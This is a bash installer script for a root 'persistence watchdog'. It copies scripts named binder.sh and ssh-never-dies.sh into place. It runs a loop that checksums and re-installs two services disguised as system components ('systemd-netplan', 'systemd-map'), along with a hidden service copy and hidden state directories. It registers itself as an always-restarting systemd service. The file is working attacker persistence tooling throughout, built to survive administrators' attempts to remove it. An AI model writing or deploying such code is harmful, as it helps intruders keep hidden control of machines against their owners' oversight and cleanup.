#!/usr/bin/env bash
# Watchdog Installer - Sets up the persistence watchdog
# axon | AU
set -euo pipefail

need_root() {
  if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
    echo "Run as root." >&2
    exit 1
  fi
}

need_root

echo "[*] Installing persistence watchdog..."

# Create directories
install -d /usr/local/lib/persistence
install -d /etc/systemd/system
install -d /var/log

# Copy original installer scripts to permanent location
if [ -f "/mnt/user-data/uploads/binder.sh" ]; then
    cp /mnt/user-data/uploads/binder.sh /usr/local/lib/persistence/binder.sh
    chmod 755 /usr/local/lib/persistence/binder.sh
    echo "[+] Copied binder.sh to /usr/local/lib/persistence/"
else
    echo "[!] Warning: binder.sh not found in uploads, watchdog may not function"
fi

if [ -f "/mnt/user-data/uploads/ssh-never-dies.sh" ]; then
    cp /mnt/user-data/uploads/ssh-never-dies.sh /usr/local/lib/persistence/ssh-never-dies.sh
    chmod 755 /usr/local/lib/persistence/ssh-never-dies.sh
    echo "[+] Copied ssh-never-dies.sh to /usr/local/lib/persistence/"
else
    echo "[!] Warning: ssh-never-dies.sh not found in uploads, watchdog may not function"
fi

# Create the watchdog script
cat > /usr/local/lib/persistence/watchdog.sh <<'WATCHDOG_SCRIPT'
#!/usr/bin/env bash
# Persistence Watchdog - Monitors and respawns both mechanisms
set -euo pipefail

# Configuration
CHECK_INTERVAL="${CHECK_INTERVAL:-10}"
LOG_FILE="${LOG_FILE:-/var/log/persistence-watchdog.log}"
SCRIPT_DIR="/usr/local/lib/persistence"

# File checksums storage
CHECKSUM_DIR="/var/opt/.watchdog-state"
mkdir -p "$CHECKSUM_DIR"
chmod 700 "$CHECKSUM_DIR"

log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE" >&2
}

have() { 
    command -v "$1" >/dev/null 2>&1
}

calc_checksum() {
    local file="$1"
    if [ ! -e "$file" ]; then
        echo "MISSING"
        return
    fi
    
    if have sha256sum; then
        sha256sum "$file" 2>/dev/null | awk '{print $1}'
    elif have shasum; then
        shasum -a 256 "$file" 2>/dev/null | awk '{print $1}'
    else
        md5sum "$file" 2>/dev/null | awk '{print $1}'
    fi
}

store_checksum() {
    local file="$1"
    local checksum_file="${CHECKSUM_DIR}/$(echo "$file" | tr '/' '_')"
    calc_checksum "$file" > "$checksum_file"
}

file_changed() {
    local file="$1"
    local checksum_file="${CHECKSUM_DIR}/$(echo "$file" | tr '/' '_')"
    
    if [ ! -e "$checksum_file" ]; then
        return 1
    fi
    
    local old_sum=$(cat "$checksum_file" 2>/dev/null || echo "")
    local new_sum=$(calc_checksum "$file")
    
    [ "$old_sum" != "$new_sum" ]
}

reinstall_binder() {
    log_message "BINDER: Reinstalling systemd-netplan mechanism"
    
    if [ -x "${SCRIPT_DIR}/binder.sh" ]; then
        bash "${SCRIPT_DIR}/binder.sh" 2>&1 | while read line; do
            log_message "BINDER-INSTALL: $line"
        done
        log_message "BINDER: Reinstallation complete"
    else
        log_message "BINDER: ERROR - installer script not found at ${SCRIPT_DIR}/binder.sh"
    fi
}

reinstall_mapper() {
    log_message "MAPPER: Reinstalling systemd-map mechanism"
    
    if [ -x "${SCRIPT_DIR}/ssh-never-dies.sh" ]; then
        # Kill the journalctl follow at the end
        timeout 5 bash "${SCRIPT_DIR}/ssh-never-dies.sh" 2>&1 | while read line; do
            log_message "MAPPER-INSTALL: $line"
        done || true
        log_message "MAPPER: Reinstallation complete"
    else
        log_message "MAPPER: ERROR - installer script not found at ${SCRIPT_DIR}/ssh-never-dies.sh"
    fi
}

check_binder() {
    local needs_reinstall=0
    
    if file_changed "/usr/local/bin/systemd-netplan.sh"; then
        log_message "BINDER: systemd-netplan.sh changed or missing"
        needs_reinstall=1
    fi
    
    if file_changed "/etc/systemd/system/systemd-netplan.service"; then
        log_message "BINDER: systemd-netplan.service changed or missing"
        needs_reinstall=1
    fi
    
    if [ ! -f "/etc/systemd/network/.systemd-netplan/systemd-netplan.service" ]; then
        log_message "BINDER: hidden service copy missing"
        needs_reinstall=1
    fi
    
    if ! systemctl is-enabled systemd-netplan.service >/dev/null 2>&1; then
        log_message "BINDER: service not enabled"
        needs_reinstall=1
    fi
    
    if ! systemctl is-active systemd-netplan.service >/dev/null 2>&1; then
        log_message "BINDER: service not active"
        needs_reinstall=1
    fi
    
    if [ $needs_reinstall -eq 1 ]; then
        reinstall_binder
        store_checksum "/usr/local/bin/systemd-netplan.sh"
        store_checksum "/etc/systemd/system/systemd-netplan.service"
    fi
}

check_mapper() {
    local needs_reinstall=0
    
    if file_changed "/usr/local/sbin/systemd-map.sh"; then
        log_message "MAPPER: systemd-map.sh changed or missing"
        needs_reinstall=1
    fi
    
    if file_changed "/usr/local/sbin/systemd-map-seed.sh"; then
        log_message "MAPPER: systemd-map-seed.sh changed or missing"
        needs_reinstall=1
    fi
    
    if file_changed "/etc/systemd/system/systemd-map.service"; then
        log_message "MAPPER: systemd-map.service changed or missing"
        needs_reinstall=1
    fi
    
    if [ ! -d "/var/opt/maps/.safe" ]; then
        log_message "MAPPER: safe directory missing"
        needs_reinstall=1
    fi
    
    if ! systemctl is-enabled systemd-map.service >/dev/null 2>&1; then
        log_message "MAPPER: service not enabled"
        needs_reinstall=1
    fi
    
    if ! systemctl is-active systemd-map.service >/dev/null 2>&1; then
        log_message "MAPPER: service not active"
        needs_reinstall=1
    fi
    
    if [ $needs_reinstall -eq 1 ]; then
        reinstall_mapper
        store_checksum "/usr/local/sbin/systemd-map.sh"
        store_checksum "/usr/local/sbin/systemd-map-seed.sh"
        store_checksum "/etc/systemd/system/systemd-map.service"
    fi
}

initialize_checksums() {
    log_message "INIT: Storing initial checksums"
    
    store_checksum "/usr/local/bin/systemd-netplan.sh"
    store_checksum "/etc/systemd/system/systemd-netplan.service"
    
    store_checksum "/usr/local/sbin/systemd-map.sh"
    store_checksum "/usr/local/sbin/systemd-map-seed.sh"
    store_checksum "/etc/systemd/system/systemd-map.service"
    
    log_message "INIT: Checksums stored"
}

main() {
    touch "$LOG_FILE"
    chmod 640 "$LOG_FILE"
    
    log_message "WATCHDOG: Starting (interval=${CHECK_INTERVAL}s)"
    
    if [ ! -d "$CHECKSUM_DIR" ] || [ -z "$(ls -A "$CHECKSUM_DIR" 2>/dev/null)" ]; then
        initialize_checksums
    fi
    
    while true; do
        check_binder
        check_mapper
        sleep "$CHECK_INTERVAL"
    done
}

main
WATCHDOG_SCRIPT

chmod 755 /usr/local/lib/persistence/watchdog.sh

# Create systemd service for the watchdog
cat > /etc/systemd/system/persistence-watchdog.service <<'SERVICE_EOF'
[Unit]
Description=Persistence Watchdog
After=network.target
Wants=network.target

[Service]
Type=simple
ExecStart=/usr/local/lib/persistence/watchdog.sh
Restart=always
RestartSec=5
User=root
Group=root

Environment="CHECK_INTERVAL=10"
Environment="LOG_FILE=/var/log/persistence-watchdog.log"

[Install]
WantedBy=multi-user.target
SERVICE_EOF

chmod 644 /etc/systemd/system/persistence-watchdog.service

# Set ownership
chown -R root:root /usr/local/lib/persistence
chmod -R go-rwx /usr/local/lib/persistence

# Enable and start the watchdog
systemctl daemon-reload
systemctl enable persistence-watchdog.service
systemctl start persistence-watchdog.service

echo ""
echo "[+] Persistence watchdog installed and started"
echo "[+] Service: persistence-watchdog.service"
echo "[+] Log file: /var/log/persistence-watchdog.log"
echo ""
echo "Check status with: systemctl status persistence-watchdog.service"
echo "View logs with: tail -f /var/log/persistence-watchdog.log"